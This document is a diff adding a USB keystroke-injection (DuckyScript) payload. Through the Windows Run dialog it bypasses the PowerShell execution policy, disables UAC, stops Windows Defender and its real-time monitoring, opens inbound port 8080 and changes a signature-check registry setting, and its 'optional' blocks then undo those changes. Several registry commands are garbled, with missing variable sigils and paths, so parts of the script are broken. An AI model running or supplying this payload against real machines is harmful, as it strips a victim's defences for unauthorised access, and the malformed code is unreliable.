@@ -1,0 +1,115 @@
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Set PowerShell execution policy to bypass restrictions
+STRING powershell.exe -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Force"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog again
+GUI r
+DELAY 500
+# Disable User Account Control (UAC) by modifying registry
+STRING powershell.exe -Command "
+# Define registry entry name and path
+name = 'EnableLUA';
+regPath -Name
+# Set value to disable UAC
+value -PropertyType DWORD -Force"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Stop and disable Windows Defender service
+STRING powershell.exe -Command "Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Disable Windows Defender real-time protection
+STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring `$true"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Add a new firewall rule to allow incoming connections on port 8080
+STRING powershell.exe -Command "New-NetFirewallRule -DisplayName 'AllowIncoming8080' -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow -Enabled True"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Modify additional security settings (potentially disables signature checks)
+STRING powershell.exe –command "
+# Define registry entry name and path
+nameNP = 'NC_Signature_Enabled';
+regPathNP –Name
+# Set value to disable signature-based checks
+valueNP -PropertyType DWORD -Force"
+DELAY 500
+ENTER
+
+# Optional: Restore Windows Defender real-time protection
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+# Enable real-time monitoring again
+STRING set-MpPreference -DisableRealTimeMonitoring `$false
+DELAY 500
+ENTER
+
+# Optional: Restart and re-enable Windows Defender service
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+# Start the service
+STRING start-service -Name WinDefend
+DELAY 500
+ENTER
+# Set the startup type back to automatic
+STRING set-service -Name WinDefend -StartupType Automatic
+DELAY 500
+ENTER
+
+# Optional: Remove the previously added firewall rule
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+# Remove the rule allowing inbound traffic on port 8080
+STRING remove-netfirewallrule -DisplayName 'AllowIncoming8080'
+DELAY 500
+ENTER
+
+# Optional: Re-enable User Account Control (UAC)
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+STRING $regpathReenableUac='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System';
+# Specify name and value for UAC
+$namereenableuac='EnableLUA';
+$valuereenableuac=1;
+# Re-enable UAC
+New-ItemProperty -Path $regpathReenableUac -Name $namereenableuac -Value $valuereenableuac -PropertyType DWORD -Force
+DELAY 1000
+ENTER
